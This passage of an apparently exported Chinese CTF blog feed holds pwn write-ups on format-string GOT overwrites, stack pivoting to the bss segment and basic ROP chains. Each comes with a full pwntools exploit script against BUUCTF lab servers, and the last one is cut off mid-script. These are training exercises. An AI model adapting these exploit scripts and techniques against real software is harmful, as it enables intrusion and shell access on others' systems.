class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"summon \"</span><span class=\"token operator\">+</span> name<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"show\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">up</span><span class=\"token punctuation\">(</span> l <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"level-up \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"release\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\nnew<span class=\"token punctuation\">(</span><span class=\"token string\">\"aaaaaaaa\"</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nnew<span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"strike\"</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "堆",
                "BUUCTF"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/",
            "url": "http://niyah.cn/CTF/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/",
            "title": "格式化字符串",
            "date_published": "2021-01-30T06:10:27.000Z",
            "content_html": "<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token operator\">%</span><span class=\"token punctuation\">[</span>parameter<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>flags<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>field width<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">.</span>precision<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>length<span class=\"token punctuation\">]</span>type</code></pre>\n<a id=\"more\"></a>\n<h2 id=\"r2t4\"><a class=\"markdownIt-Anchor\" href=\"#r2t4\">#</a> r2t4</h2>\n<p>本题是个格式化字符串漏洞</p>\n<p>这里我们了解一下格式化字符串的格式，其基本格式如下</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token operator\">%</span><span class=\"token punctuation\">[</span>parameter<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>flags<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>field width<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">.</span>precision<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>length<span class=\"token punctuation\">]</span>type</code></pre>\n<p>每一种 pattern 的含义请具体参考维基百科的<a href=\"https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2\">格式化字符串</a> 。以下几个 pattern 中的对应选择需要重点关注</p>\n<ul>\n<li>parameter\n<ul>\n<li>n$，获取格式化字符串中的指定参数</li>\n</ul>\n</li>\n<li>flag</li>\n<li>field width\n<ul>\n<li>输出的最小宽度</li>\n</ul>\n</li>\n<li>precision\n<ul>\n<li>输出的最大长度</li>\n</ul>\n</li>\n<li>length，输出的长度\n<ul>\n<li>hh，输出一个字节</li>\n<li>h，输出一个双字节</li>\n</ul>\n</li>\n<li>type\n<ul>\n<li>d/i，有符号整数</li>\n<li>u，无符号整数</li>\n<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>\n<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>\n<li>p， void * 型，输出对应变量的值。printf (&quot;% p&quot;,a) 用地址的格式打印变量 a 的值，printf (&quot;% p&quot;, &amp;a) 打印变量 a 所在的地址。</li>\n<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>\n<li>%， ' <code>%</code> ' 字面值，不接受任何 flags, width。</li>\n</ul>\n</li>\n</ul>\n<p>首先确定参数偏移</p>\n<p>进入 IDA 进行分析，直接可以看到有一个后门函数可以直接输出 flag，我们只需要调用它就行了</p>\n<p>这题是有 canary 的，但是没有关系，检查 canary 后会执行那个 **__stack_chk_fail** 函数，那么我们利用格式化字符串修改这个函数的地址为后门函数地址就可以输出 flag 了</p>\n<blockquote>\n<p>​\tbackdoor : 0x0000000000400626</p>\n<p>​    __stack_chk_fail : 0x0000000000601038</p>\n</blockquote>\n<p>我们需要将第二个地址的值改为第一个地址，这里有两种方式</p>\n<p>我比较推荐单地址修改的方法，因为一个地址对应在我们看来的两位，而这些地址的存放方式是小端序，所以 0x601038 表示的是最后两位 0x60103A 表示的是倒数第三和倒数第四位</p>\n<p>那么我们按照单字节修改的方式可以将地址划分为三块</p>\n<blockquote>\n<p>​\t60 10 38</p>\n<p>​\t40 06 26</p>\n</blockquote>\n<p>那么我们从最小的开始修改，即 0x06，我们使用 %6c 输出再使用 % x$hhn 修改格式化字符串的第 x 个参数，这个参数即__stack_chk_fail +1</p>\n<p>之后是第二小的，即 0x26，因为我们前面已经输出了 0x06 个字符，所以我们这次只需要输出 0x20 个字符，再使用 % y$hhn 修改格式化字符串的第 y 个参数，即__stack_chk_fail</p>\n<p>从小到大依次修改，最后再计算一下参数偏移就大功告成了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./r2t4'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>word_size<span class=\"token operator\">=</span><span class=\"token string\">'64'</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28241</span><span class=\"token punctuation\">)</span>\n\njump <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__stack_chk_fail'</span><span class=\"token punctuation\">]</span>\n\npayload1 <span class=\"token operator\">=</span> <span class=\"token string\">'%6c%10$hhn%32c%11$hhn%26c%12$hhn'</span>   <span class=\"token comment\">#单地址修改payload</span>\npayload2 <span class=\"token operator\">=</span> <span class=\"token string\">\"%64c%9$hn%1510c%10$hnAAA\"</span>      <span class=\"token comment\">#双地址修改payload</span>\n\npayload3 <span class=\"token operator\">=</span> payload1 <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jump<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jump<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>jump<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\npayload4 <span class=\"token operator\">=</span> payload2 <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jump<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jump<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload3<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串",
                "BUUCTF"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%A0%88%E8%BF%81%E7%A7%BB/",
            "url": "http://niyah.cn/CTF/%E6%A0%88%E8%BF%81%E7%A7%BB/",
            "title": "栈迁移",
            "date_published": "2021-01-25T10:10:27.000Z",
            "content_html": "<h2 id=\"spwn栈-bss\"><a class=\"markdownIt-Anchor\" href=\"#spwn栈-bss\">#</a> spwn（栈 -&gt;bss）</h2>\n<p>本题考察的是栈迁移</p>\n<p>进入 IDA 进行分析，我们可以看到本题为我们提供了两个输入：</p>\n<p>第一次输入我们可以把数据写入到程序的 bss 段；</p>\n<p>第二次输入我们可以造成溢出，但是只能 8 个字节，做 rop 链显然是太短了，但好在程序之中有 leave 片段</p>\n<p>在 32 位汇编下相当于:</p>\n<blockquote>\n<p>mov esp,ebp;<br>\npop ebp</p>\n</blockquote>\n<p>将栈顶指针 esp 指向帧指针 ebp，然后 pop 备份的原帧指针到 ebp，实现栈迁移</p>\n<p>由于我们的程序是 32 位程序，我们可以覆盖把 ebp 覆盖成 bss 段地址之后执行 leave 指令，这样我们 ebp 便指向了 bss 段，我们便可以执行我们第一次输入到 bss 段的内容；</p>\n<p>之后是正常的 rop 过程。</p>\n<p>完整流程如下：</p>\n<blockquote>\n<p>1. 第一轮的第一次输入把泄露函数地址的 rop 链写入 bss 段；</p>\n<p>2. 第一轮的第二次输入进行栈迁移至 bss 段将函数地址泄露；</p>\n<p>3. 跳转到 main 进行第二轮执行；</p>\n<p>3. 查找 libc 库；</p>\n<p>4. 使用 system 构造新的 rop 链；</p>\n<p>5. 第二轮的第一次输入输入新的 rop 链；</p>\n<p>6. 第一轮的第二次输入进行栈迁移至 bss 来 getshell。</p>\n</blockquote>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher\n\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"debug\"</span>\n\np <span class=\"token operator\">=</span> remote <span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28070</span><span class=\"token punctuation\">)</span>\n\nwrite_plt <span class=\"token operator\">=</span> <span class=\"token number\">0x8048380</span>\nwrite_got <span class=\"token operator\">=</span> <span class=\"token number\">0x804A01C</span>\nmian_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x8048513</span> \nleave_ret<span class=\"token operator\">=</span> <span class=\"token number\">0x08048511</span>    <span class=\"token comment\">#leave 汇编片段leave指令是将栈顶指针esp指向帧指针ebp，然后pop备份的原帧指针到%ebp，实现栈迁移</span>\nbss_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x804A300</span>\n\npayload1 <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>mian_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\npayload2 <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bss_addr<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span>   <span class=\"token comment\">#第二个为ebp，因为有pop ebp的缘故，会将栈顶指针esp - 4，将ebp覆盖为想要调整到的位置需-4</span>\n\np<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name?\"</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"say?\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span>\n\nwrite_addr <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write_addr<span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write_addr<span class=\"token punctuation\">)</span>\nlibcbase <span class=\"token operator\">=</span> write_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span>\nsys_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span>\nbinsh_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span>\n\npayload3 <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>mian_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name?\"</span><span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span> <span class=\"token string\">\"say?\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#这题用sendline不行，原因是sendline会发送一个回车符</span></code></pre>\n<h2 id=\"ciscn_2019_es_2栈-栈\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_es_2栈-栈\">#</a> ciscn_2019_es_2（栈 -&gt; 栈）</h2>\n<p>同样是一道栈迁移题目，根据 IDA 打开来看可以发现我们的输入距离 ebp 位置有 0x28 个字节，我们可以填入 0x28 个字节让接下来的 printf 函数直接打印出 ebp 的值。</p>\n<p>接下来我们可以动调一下来看看我们 ebp 的值距离我们输入字符串位置的偏移是多少，可以发现是 0x38，那么我们就能知道我们输入的地址为 ebp 的值减去 0x38</p>\n<p>接下来是第二次输入，需要知道第二次输入同样是 0x30 个字符：本题目中没有现成的’/bin/sh’字符，我们需要构造一个指向我们输入的’/bin/sh’地址的值来作为 system 函数的参数，填满 0x28 个字节后覆盖 ebp 指向我们的输入地址，之后是 leave 栈迁移 getshell</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span>\n\n<span class=\"token comment\">#p=process('ciscn_2019_es_2')</span>\n\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">26666</span><span class=\"token punctuation\">)</span>\n\nleave <span class=\"token operator\">=</span> <span class=\"token number\">0x080484b8</span>\nsystem_plt<span class=\"token operator\">=</span><span class=\"token number\">0x8048400</span> \n\npayload1 <span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token operator\">+</span><span class=\"token string\">'abcdefgh'</span>  <span class=\"token comment\">#完全覆盖至printf输出栈上，输出ebp</span>\n\n<span class=\"token comment\">#这里esp距离ebp有0x28个字节我们直接输入0x28个来打印ebp算出偏移</span>\n<span class=\"token comment\">#刚好能输出ebp就不要多想，直接覆盖0x28就完事</span>\n\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'abcdefgh'</span><span class=\"token punctuation\">)</span>\ns_adder <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x38</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>s_adder<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bbbb'</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>system_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'cccc'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>s_adder <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>s_adder<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>leave<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n",
            "tags": [
                "PWN",
                "BUUCTF",
                "栈迁移"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E5%9F%BA%E6%9C%ACROP/",
            "url": "http://niyah.cn/CTF/%E5%9F%BA%E6%9C%ACROP/",
            "title": "基本ROP",
            "date_published": "2020-11-28T10:15:22.000Z",
            "content_html": "<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/back-1.webp\"></center>\n<a id=\"more\"></a>\n<h2 id=\"get_started_3dsctf_2016\"><a class=\"markdownIt-Anchor\" href=\"#get_started_3dsctf_2016\">#</a> get_started_3dsctf_2016</h2>\n<p>首先例行检查，是 32 位程序，而且栈溢出是可行的</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/1.png\"></center>\n<p>接下来进入 IDA 分析，我们可以看到一个明显的栈溢出漏洞</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/2.png\"></center>\n<p>接下来寻找有没有后门函数，发现是有的，main 函数之上有个 get_flag 函数</p>\n<p>点进去分析，这个函数需要传入两个参数，只要等于以下数字就可以拿到 flag</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/3.png\"></center>\n<p>我们可以根据如此就写下脚本，但我们发现这其实是不行的，经百度是原来的函数没有正常退出所导致的，所以我们需要先退出 gets 函数再传入参数</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/4.png\"></center>\n<p>所以我们先找到可以结束 gets 函数的函数即 exit 函数</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/5.png\"></center>\n<p>我们在调用后门函数之后使用 exit 函数就行了 exp 如下</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span><span class=\"token string\">\"debug\"</span>\n<span class=\"token comment\">#p = process(\"get_started_3dsctf_2016\")</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">27286</span><span class=\"token punctuation\">)</span>\n\nget_flag <span class=\"token operator\">=</span> <span class=\"token number\">0x080489A0</span>\nexit <span class=\"token operator\">=</span> <span class=\"token number\">0x0804E6A0</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span>  <span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>get_flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>exit<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">814536271</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">425138641</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"babyrop\"><a class=\"markdownIt-Anchor\" href=\"#babyrop\">#</a> babyrop</h2>\n<p>首先例行检查，32 位程序，可以栈溢出，进入主要函数分析，这里我们先要进行一波绕过</p>\n<p>strncmp 函数，对字符进行比较时会被 “/x00” 截断</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/6.png\"></center>\n<p>这次输入我们再需要做点事情才能进行下一步 rop，因为其返回值为 v5 也是栈上的变量，直接用 IDA 查看栈分布，发现 v5 就在下面，那么我们可以直接覆盖掉</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/7.png\"></center>\n<p>具体覆盖的值在下一个判断，我们可以看到 else 语句时，我们覆盖掉的值减去 0xe7 便是我们可以构造的 rop 链长度，所以我们尽量往大处覆盖</p>\n<center><img src=\"/CTF/%E5%9F%BA%E6%9C%ACROP/8.png\"></center>\n<p>在这之后便是正常的 rop，Exp 如下</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher <span class=\"token comment\">#查libc的库</span>\n<span class=\"token keyword\">import</span> pwnlib\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span>\n\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">27117</span><span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./babyrop'</span><span class=\"token punctuation\">)</span>\n\nputs_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\nputs_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\nmain <span class=\"token operator\">=</span> <span class=\"token number\">0x08048825</span>\n\npayload1 <span class=\"token operator\">=</span> <span class=\"token string\">b\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">7</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">11451</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#第一次输入 截断+覆盖</span>\n\npayload2 <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0xe7</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"niya\"</span> <span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#第二次输入，泄露puts函数的地址，返回到main函数继续rop</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendlineafter <span class=\"token punctuation\">(</span><span class=\"token string\">\"ct\\n\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span>\n\nputs_addr <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  接收<span class=\"token number\">4</span>个字节将其解包作为puts函数地址\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  \nlibc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span>  通过找到的puts函数寻找出libc\n\nlibc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#计算基地址</span>\nsystem_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span>\nbinsh_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span>\n\npayload3 <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0xe7</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"niya\"</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span 